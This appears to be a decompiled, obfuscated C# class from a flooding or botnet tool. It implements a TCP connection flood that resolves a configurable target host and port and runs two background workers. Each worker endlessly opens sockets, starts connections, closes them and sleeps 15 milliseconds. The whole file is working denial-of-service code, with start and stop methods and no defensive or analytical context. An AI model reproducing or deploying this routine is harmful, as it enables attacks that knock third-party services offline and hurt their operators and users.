using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns1;

internal class Class4
{
	private static IPEndPoint ipendPoint_0;

	private static BackgroundWorker[] backgroundWorker_0;

	private static bool bool_0 = false;

	public static string string_0 = string.Empty;

	public static ushort ushort_0 = 0;

	private static int int_0 = 2;

	public static void smethod_0()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).get_AddressList()[0], (int)ushort_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), (int)ushort_0);
		}
		backgroundWorker_0 = (BackgroundWorker[])(object)new BackgroundWorker[int_0];
		bool_0 = true;
		for (int i = 0; i < int_0; i++)
		{
			backgroundWorker_0[i] = new BackgroundWorker();
			backgroundWorker_0[i].add_DoWork(new DoWorkEventHandler(smethod_2));
			backgroundWorker_0[i].set_WorkerSupportsCancellation(true);
			backgroundWorker_0[i].RunWorkerAsync();
		}
	}

	public static void smethod_1()
	{
		try
		{
			bool_0 = false;
			for (int i = 0; i < int_0; i++)
			{
				backgroundWorker_0[i].CancelAsync();
				backgroundWorker_0[i] = null;
			}
		}
		catch
		{
		}
	}

	private static void smethod_2(object sender, DoWorkEventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		while (bool_0)
		{
			try
			{
				Socket val = new Socket(((EndPoint)ipendPoint_0).get_AddressFamily(), (SocketType)1, (ProtocolType)6);
				val.BeginConnect((EndPoint)(object)ipendPoint_0, (AsyncCallback)smethod_3, (object)val);
				val.set_Blocking(false);
				val.Close();
				Thread.Sleep(15);
			}
			catch
			{
			}
		}
	}

	private static void smethod_3(IAsyncResult iasyncResult_0)
	{
	}
}
